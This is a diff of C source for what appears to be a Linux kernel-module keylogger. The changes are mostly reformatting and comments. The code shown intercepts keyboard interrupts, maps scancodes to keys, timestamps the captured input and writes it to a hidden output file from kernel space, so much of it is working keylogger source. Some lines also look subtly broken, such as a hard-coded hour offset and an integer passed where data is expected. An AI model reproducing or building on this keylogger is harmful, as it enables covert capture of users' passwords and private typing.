@@ -69,45 +69,45 @@ int get_timestamp_index(char c);
 /* For the 2nd index: 	index = 0, no special keys enabled
 			index = 1, only shift enabled
 			index = 2, only caps lock enabled
-			index = 3, both caps lock and shift enabled
+			index = 3, both caps lock and shift enabled (TODO: still needs to be implemented)
 */
 char *scancodes[][NUMBER_OF_MODES] = {
-	{"/0", "/0", "/0"}, 	{"/e", "/e", "/e"}, 	{"1", "!", "1"}, 
+	{"/0", "/0", "/0"},		{"/e", "/e", "/e"},	 	{"1", "!", "1"}, 
 	{"2", "@", "2"}, 		{"3", "#", "3"}, 		{"4", "$", "4"}, 
 	{"5", "%", "5"}, 		{"6", "^", "6"}, 		{"7", "&", "7"}, 
 	{"8", "*", "8"}, 		{"9", "(", "9"}, 		{"0", ")", "0"}, 
 	{"-","_", "-"}, 		{"=", "+", "="}, 		{"/b", "/b", "/b"}, 
-	{"/t", "/t", "/t"}, 	{"q", "Q", "Q"}, 		{"w", "W", "W"},
+	{"/t", "/t", "/t"}, 		{"q", "Q", "Q"}, 		{"w", "W", "W"},
 	{"e", "E", "E"}, 		{"r","R", "R"}, 		{"t", "T", "T"}, 
 	{"y", "Y", "Y"}, 		{"u", "U", "U"}, 		{"i","I", "I"}, 
 	{"o", "O", "O"},		{"p", "P", "P"},		{"[", "{", "["}, 
-	{"]", "}", "]"}, 		{"/n", "/n", "/n"}, 	{"LCtrl", "LCtrl", "LCtrl"}, 
+	{"]", "}", "]"}, 		{"/n", "/n", "/n"}, 		{"LCtrl", "LCtrl", "LCtrl"}, 
 	{"a", "A", "A"}, 		{"s", "S", "S"}, 		{"d", "D", "D"}, 
 	{"f", "F", "F"}, 		{"g", "G", "G"}, 		{"h", "H", "H"}, 
 	{"j", "J", "J"}, 		{"k", "K", "K"}, 		{"l", "L", "L"}, 
-	{";", ":", ";"}, 		{"\'", "\"", "\'"}, 	{"`", "~", "`"},
-	{"LShift","LShift","LShift"},				{"\\", "|", "\\"}, 
+	{";", ":", ";"}, 		{"\'", "\"", "\'"}, 		{"`", "~", "`"},
+	{"LShift","LShift","LShift"},					{"\\", "|", "\\"}, 
 	{"z", "Z", "Z"}, 		{"x", "X", "X"}, 		{"c", "C", "C"}, 
 	{"v", "V", "V"}, 		{"b", "B", "B"}, 		{"n", "N", "N"},
 	{"m", "M", "M"}, 		{",", "<", ","}, 		{".", ">", "."},
 	{"/", "?", "/"},		{"RShift", "RShift", "RShift"},
-	{"PrtScn", "KeyPad", "PrtScn"},				{"LAlt", "LAlt", "LAlt"}, 
+	{"PrtScn", "KeyPad", "PrtScn"},	{"LAlt", "LAlt", "LAlt"}, 
 	{" ", " ", " "}, 		{"CapsLock", "CapsLock", "CapsLock"}, 
-	{"F1", "F1", "F1"}, 	{"F2", "F2", "F2"}, 	{"F3", "F3", "F3"}, 
-	{"F4", "F4", "F4"}, 	{"F5", "F5", "F5"}, 	{"F6", "F6", "F6"},
-	{"F7", "F7", "F7"}, 	{"F8", "F8", "F8"}, 	{"F9", "F9", "F9"},
-	{"F10", "F10", "F10"}, 	{"NumLock", "NumLock", "NumLock"}, 
-	{"ScrlLck", "ScrlLck", "ScrlLck"}, 			{"Keypad-7", "Home", "Keypad-7"}, 
+	{"F1", "F1", "F1"}, 		{"F2", "F2", "F2"}, 		{"F3", "F3", "F3"}, 
+	{"F4", "F4", "F4"}, 		{"F5", "F5", "F5"}, 		{"F6", "F6", "F6"},
+	{"F7", "F7", "F7"}, 		{"F8", "F8", "F8"}, 		{"F9", "F9", "F9"},
+	{"F10", "F10", "F10"}, 		{"NumLock", "NumLock", "NumLock"}, 
+	{"ScrlLck", "ScrlLck", "ScrlLck"}, 				{"Keypad-7", "Home", "Keypad-7"}, 
 	{"Keypad-8", "Up", "Keypad-8"}, 				{"Keypad-9", "PgUp", "Keypad-9"}, 
 	{"-", "-", "-"},		{"Keypad-4", "Left", "Keypad-4"},
-	{"Keypad-5", "Keypad-5", "Keypad-5"},		{"Keypad-6", "Right", "Keypad-6"},
+	{"Keypad-5", "Keypad-5", "Keypad-5"},				{"Keypad-6", "Right", "Keypad-6"},
 	{"+", "+", "+"}, 		{"Keypad-1", "End", "Keypad-1"}, 
-	{"Keypad-2", "Down", "Keypad-2"}, 			{"Keypad-3", "PgDn", "Keypad-3"},
-	{"Keypad-0", "Ins", "Keypad-0"}, 			{"Keypad-.", "Del", "Keypad-."}, 
-	{"Alt-SysRq", "Alt-SysRq", "Alt-SysRq"}, 		{"\0", "\0", "\0"}, 
-	{"\0", "\0", "\0"}, 	{"F11", "F11", "F11"}, 	{"F12", "F12", "F12"} };                                  
+	{"Keypad-2", "Down", "Keypad-2"}, 				{"Keypad-3", "PgDn", "Keypad-3"},
+	{"Keypad-0", "Ins", "Keypad-0"}, 				{"Keypad-.", "Del", "Keypad-."}, 
+	{"Alt-SysRq", "Alt-SysRq", "Alt-SysRq"}, 			{"\0", "\0", "\0"}, 
+	{"\0", "\0", "\0"}, 		{"F11", "F11", "F11"}, 		{"F12", "F12", "F12"} };                                  
 
-//Creating the output file
+// Create the output file
 struct file *createFile(const char *path) 
 {
     struct file *fileP = NULL;
@@ -125,7 +125,7 @@ struct file *createFile(const char *path)
     return fileP;
 }
 
-//Write to the output file
+// Write to the output file
 int writeToFile(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
 {
     mm_segment_t oldFileSpace;
@@ -140,6 +140,7 @@ int writeToFile(struct file *file, unsigned long long offset, unsigned char *dat
     return ret;
 }
 
+// Close the output file
 void closeFile(struct file *file) 
 {
     filp_close(file, NULL);
@@ -155,6 +156,7 @@ static irqreturn_t get_scancode(int irq, void *id)
 	return IRQ_HANDLED;
 }
 
+// converts a scancode to the appropriate key in the scancodes array
 void scancode_to_key(char scancode)
 {
 	if (scancodes[scancode][0] != '\0')
@@ -200,6 +202,7 @@ void scancode_to_key(char scancode)
 	}
 }
 
+// checks if shift or caps lock were pressed
 void check_shift(unsigned char scancode)
 {
 	if (scancode == LEFT_SHIFT || scancode == RIGHT_SHIFT)
@@ -252,10 +255,11 @@ void write_buffer_to_output(void)
 	}
 	
 	display_count += count;
-writeToFile(outfile, 0, display_count, 1);
+	writeToFile(outfile, 0, display_count, 1);
 	printk("Character buffer written to output.\n");
 }
 
+// generates a timestamp string in the form [hh:mm:ss]
 void generate_timestamp(void)
 {
 	long total_sec;
@@ -267,13 +271,14 @@ void generate_timestamp(void)
 
 	sec = total_sec % 60;
 	min = (total_sec / 60) % 60;
-	hr = (((total_sec / 3600) / 365) % 24) - 1;
+	hr = (((total_sec / 3600) % 24) - 5);
 
 	// build timestamp string
 	sprintf(timestamp, "[%02d:%02d:%02d]", hr, min, sec);
 	printk("Time: %s", timestamp);
 }
 
+// initializes all timers used by the kernel module
 static void initialize_timers(void)
 {
 	// timestamp timer
@@ -283,10 +288,10 @@ static void initialize_timers(void)
 	hrtimer_start(&ts_timer, ts_period, HRTIMER_MODE_REL);
 }
 
+// adds a timestamp to the output file every 15 seconds and restarts the timestamp timer 
 static enum hrtimer_restart print_timestamp(struct hrtimer * timer)
 {
 	char code;
-	// adds a timestamp to the output file every 15 seconds
 	mutex_lock(&buffer_mutex);
 	generate_timestamp();
 
@@ -319,11 +324,13 @@ static enum hrtimer_restart print_timestamp(struct hrtimer * timer)
 	return HRTIMER_RESTART;
 }
 
+// removes all timers from memory when the kernel module is exited
 static void remove_timers(void)
 {
     hrtimer_cancel(&ts_timer);
 }
 
+// finds the array index for each character associated with a timestamp
 int get_timestamp_index(char c)
 {
 	int index = 0;
